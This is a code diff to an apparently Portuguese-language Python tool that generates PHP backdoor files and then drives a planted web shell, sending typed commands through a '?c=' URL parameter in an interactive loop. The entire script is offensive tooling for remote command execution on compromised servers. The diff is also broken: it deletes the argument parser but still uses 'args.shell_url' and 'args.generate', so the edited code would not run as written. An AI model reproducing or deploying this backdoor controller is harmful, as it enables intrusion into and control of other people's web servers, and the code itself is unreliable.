@@ -1,37 +1,42 @@
-from argparse import ArgumentParser
 from configparser import ConfigParser
 from requests import get
 from time import sleep
-from sys import stdout
+import sys
 
+def inicio():
+  print ("Bem vindo ao heavly! \n")
+  print ("Você não inseriu nenhum argumento! \n")
+  print ("Como usar: \n")
+  print ("Gerar backdoor: heavly.py -g NomeDoBackdoor SenhaDoBackdoor \n")
+  print ("Conectar ao servidor: heavly.py -u http://localhost/shell.php senha")
+  print ("Qualquer dúvida, ler o README.md")
+  
 
-parser = ArgumentParser()
-parser.add_argument("-u", dest="shell_url", action="store",
-                    help="Url de sua shell!")
-parser.add_argument("-g", dest="generate", action="store",
-                    help="Cria seu payload")
-args = parser.parse_args()
+argumentoA = sys.argv[0]
+
 
 for i in range(50):
     print("/-\|"[i % 4], end="\b")
-    stdout.flush()
+    sys.stdout.flush()
     sleep(0.1)
 
-if args.generate:
-    shell_name = str(args.generate)
-    shell = shell_name+'.php'
-    opfile = open(shell,'+w')
-    config = ConfigParser()
-    config.read_file(open('config.ini'))
+try:
+    if sys.argv[1] == "-u":
+        pwd = get(args.shell_url + "?c=pwd").text.replace("\n", "")
+        pwd += "$ "
+        while True:
+            command = input(pwd)
+            result = get(args.shell_url + "?c=" + command).text
+            print(result)
+    if sys.argv[1] == "-g":
+        shell_name = str(args.generate)
+        shell = shell_name+'.php'
+        opfile = open(shell,'+w')
+        config = ConfigParser()
+        config.read_file(open('config.ini'))
 
-    opfile.write(config['DEFAULT']['code'])
-    opfile.close()
-    print('Generated file '+shell)
-
-if args.shell_url:
-    pwd = get(args.shell_url + "?c=pwd").text.replace("\n", "")
-    pwd += "$ "
-    while True:
-        command = input(pwd)
-        result = get(args.shell_url + "?c=" + command).text
-        print(result)
+        opfile.write(config['DEFAULT']['code'])
+        opfile.close()
+        print('Generated file '+shell)
+except IndexError:
+  inicio()
